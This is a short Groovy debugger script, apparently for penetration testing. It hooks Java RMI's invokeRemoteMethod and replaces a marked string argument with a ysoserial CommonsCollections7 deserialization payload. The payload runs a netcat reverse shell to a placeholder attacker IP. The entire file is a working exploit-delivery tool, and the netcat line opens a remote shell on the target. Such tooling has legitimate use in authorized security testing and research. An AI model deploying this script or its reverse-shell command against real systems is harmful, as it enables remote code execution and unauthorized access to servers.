def payloadName = "CommonsCollections7";  
def payloadCommand = "/usr/bin/nc -e /bin/bash <ATTACKER_IP> 4646";  
def needle = "Mal_String_Mal"  
  
println "Loaded..."  
  
// set a breakpoint at "invokeRemoteMethod", search the passed argument for a String object  
// that contains needle. If found, replace the object with the generated payload  
vm.methodEntryBreakpoint("java.rmi.server.RemoteObjectInvocationHandler", "invokeRemoteMethod") {  
  
  println "[+] java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod() is called"  
  
  // make sure that the payload class is loaded by the classloader of the debugee
  vm.loadClass("ysoserial.payloads." + payloadName);  
  
  // get the Array of Objects that were passed as Arguments  
  delegate."@2".eachWithIndex { arg,idx ->  
     println "[+] Argument " + idx + ": " + arg[0].toString();  
     if(arg[0].toString().contains(needle)) {  
        println "[+] Needle " + needle + " found, replacing String with payload"   
        // Create a new instance of the ysoserial payload in the debuggee  
        def payload = vm._new("ysoserial.payloads." + payloadName);  
        def payloadObject = payload.getObject(payloadCommand)  
     
        vm.ref("java.lang.reflect.Array").set(delegate."@2",idx, payloadObject);  
        println "[+] Done.."  
     }  
  }  
}
